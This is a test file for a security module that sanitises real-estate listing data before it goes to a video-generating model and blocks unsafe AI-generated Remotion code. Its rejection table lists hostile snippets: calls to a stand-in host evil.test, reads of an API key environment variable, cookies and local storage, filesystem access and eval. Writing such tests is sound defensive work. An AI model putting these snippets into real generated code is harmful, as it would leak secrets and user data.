import { describe, expect, it } from 'vitest';
import {
  sanitizePortfolioForVideoModel,
  sanitizeGeneratedRemotionCode,
} from './ai-video-security';

const safeCode = `
import React from 'react';
import { AbsoluteFill } from 'remotion';
import { GeneratedVideoRuntime } from '@business-ceo/video-runtime';
export const videoPlan = {"schemaVersion":1};
export default function GeneratedPortfolioVideo({facts}: {facts: unknown}) {
  return <AbsoluteFill><GeneratedVideoRuntime plan={videoPlan} facts={facts} /></AbsoluteFill>;
}`;

describe('AI video security boundary', () => {
  it('removes phone, email, URLs and advisor identity before free-model calls', () => {
    const sanitized = sanitizePortfolioForVideoModel({
      title: 'Kestel 2+1 Daire',
      referenceCode: 'P-104',
      location: 'Alanya / Kestel',
      price: 5_250_000,
      roomCount: '2+1',
      area: 110,
      description: 'Bilgi: efe@example.com, +90 543 572 07 69, https://private.test/x',
      features: ['Deniz manzarası', 'Ara: 0532 111 22 33'],
      company: { name: 'Business CEO AI', logoUrl: 'https://blob.test/logo.png', instagramUrl: 'https://instagram.com/test' },
      advisor: { name: 'Efe Eren', phone: '+905435720769', email: 'efe@example.com' },
      photos: [
        { id: 'media-1', url: 'https://blob.test/private.jpg?token=secret', fileName: 'oda.jpg', isCover: true, width: 1200, height: 800 },
      ],
    });

    const serialized = JSON.stringify(sanitized);
    expect(serialized).not.toContain('efe@example.com');
    expect(serialized).not.toContain('905435720769');
    expect(serialized).not.toContain('blob.test');
    expect(serialized).not.toContain('Efe Eren');
    expect(sanitized.assets).toEqual([{ assetId: 'media-1', index: 0, isCover: true, width: 1200, height: 800 }]);
  });

  it('accepts only the controlled Remotion runtime imports', () => {
    const result = sanitizeGeneratedRemotionCode(safeCode);
    expect(result.code).toContain('GeneratedVideoRuntime');
    expect(result.hash).toMatch(/^[a-f0-9]{64}$/);
    expect(result.embeddedPlan).toEqual({ schemaVersion: 1 });
  });

  it.each([
    "fetch('https://evil.test')",
    "new WebSocket('wss://evil.test')",
    "import('https://evil.test/a.js')",
    'process.env.OPENROUTER_API_KEY',
    'document.cookie',
    "localStorage.getItem('x')",
    'window.top.location',
    "require('fs')",
    "eval('alert(1)')",
  ])('rejects forbidden generated-code access: %s', (attack) => {
    expect(() => sanitizeGeneratedRemotionCode(`${safeCode}\n${attack};`)).toThrow(/zin verilmeyen|yasak/i);
  });

  it('rejects non-allowlisted imports', () => {
    expect(() => sanitizeGeneratedRemotionCode(`${safeCode}\nimport x from 'axios';`)).toThrow(/import/i);
  });

  it('rejects a computed video plan instead of executing it', () => {
    expect(() => sanitizeGeneratedRemotionCode(safeCode.replace('{"schemaVersion":1}', 'buildPlan()'))).toThrow(/sabit JSON/i);
  });
});
